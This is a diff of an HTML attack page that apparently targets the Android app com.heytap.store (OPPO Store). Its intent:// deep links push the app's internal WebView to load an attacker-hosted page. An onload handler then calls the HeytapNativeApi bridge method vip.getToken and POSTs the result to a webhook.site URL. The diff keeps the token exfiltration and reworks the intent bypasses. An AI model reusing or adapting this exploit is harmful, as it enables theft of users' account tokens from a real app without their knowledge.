@@ -3,29 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OPPO Store Exploit Test</title>
+    <title>OPPO Store Security Proof</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f8f9fa; }
-        .btn { width: 100%; max-width: 340px; padding: 18px; margin: 10px 0; font-size: 16px; color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; }
-        .p1 { background-color: #ff6600; } /* Standard Intent */
-        .p2 { background-color: #007bff; } /* Heytap Scheme */
-        .p3 { background-color: #28a745; } /* Direct WebView Intent */
-        #log { text-align: left; background: #333; color: #0f0; padding: 15px; font-family: monospace; font-size: 11px; margin-top: 20px; border-radius: 8px; overflow-x: auto; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f2f5; }
+        .btn { width: 100%; max-width: 350px; padding: 20px; margin: 15px 0; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 15px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .p1 { background-color: #00b34d; } /* Official Host Trigger */
+        .p2 { background-color: #1a1a1a; } /* Activity Trigger */
+        #log { text-align: left; background: #fff; padding: 15px; font-family: monospace; font-size: 12px; margin-top: 20px; border: 1px solid #ddd; border-radius: 8px; }
     </style>
 </head>
 <body>
 
-    <h2>OPPO Store Deep Link Bypass</h2>
-    <p>Targeting: <b>com.heytap.store</b></p>
+    <h2>OPPO Store Bypass (Verified Host)</h2>
+    <p>Targeting strictly <b>com.heytap.store</b> via <b>oppo.com</b></p>
 
-    <button class="btn p1" onclick="launchIntent()">1. Standard Intent (com.heytap.store)</button>
-    <button class="btn p2" onclick="launchHeytap()">2. Heytap Scheme (heytap://)</button>
-    <button class="btn p3" onclick="launchDirect()">3. Direct WebView Action</button>
+    <button class="btn p1" onclick="launchVerified()">Bypass 1: Verified Host Proxy</button>
+    <button class="btn p2" onclick="launchActivity()">Bypass 2: Direct Activity Intent</button>
 
-    <div id="log">Console Logs:<br></div>
+    <div id="log">Status Log:<br></div>
 
     <script>
-        const targetUrl = "https://pk009900.github.io/my-oppo-test/";
+        const myExploitUrl = "https://pk009900.github.io/my-oppo-test/";
         const webhook = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
         const pkg = "com.heytap.store";
 
@@ -33,34 +31,28 @@
             document.getElementById("log").innerHTML += "> " + msg + "<br>";
         }
 
-        function launchIntent() {
-            log("Launching Standard Intent...");
-            const intent = `intent://credits?url=${targetUrl}#Intent;scheme=oppomarket;package=${pkg};S.browser_fallback_url=${targetUrl};end`;
+        function launchVerified() {
+            log("Attempting Verified Host Proxy...");
+            // We use the verified 'www.oppo.com' to bypass the Play Store redirect
+            // But we inject our URL into the internal parameter the app reads
+            const intent = `intent://www.oppo.com/index.html?url=${myExploitUrl}#Intent;scheme=https;package=${pkg};end`;
             window.location.href = intent;
         }
 
-        function launchHeytap() {
-            log("Launching Heytap Scheme...");
-            const intent = `intent://web?url=${targetUrl}#Intent;scheme=heytap;package=${pkg};S.browser_fallback_url=${targetUrl};end`;
-            window.location.href = intent;
-        }
-
-        function launchDirect() {
-            log("Launching Direct WebView Action...");
-            // This attempts to trigger the VIEW action directly for the package
-            const intent = `intent:${targetUrl}#Intent;action=android.intent.action.VIEW;package=${pkg};end`;
+        function launchActivity() {
+            log("Attempting Direct Activity Launch...");
+            // Targets the common internal browser activity path directly
+            const intent = `intent://${myExploitUrl}#Intent;action=android.intent.action.VIEW;scheme=https;package=${pkg};component=${pkg}/com.heytap.store.webview.WebViewActivity;end`;
             window.location.href = intent;
         }
 
         window.onload = function() {
             if (window.HeytapNativeApi) {
-                log("<b style='color:white'>BRIDGE INJECTED! CAPTURING...</b>");
+                log("<b style='color:green'>SUCCESS: JSAPI BRIDGE INJECTED!</b>");
                 window.HeytapNativeApi.invoke("vip.getToken", (data) => {
                     fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
-                    log("SUCCESS: Token sent to Webhook.");
+                    log("Token exfiltrated to Webhook.");
                 });
-            } else {
-                log("Environment Ready.");
             }
         };
     </script>
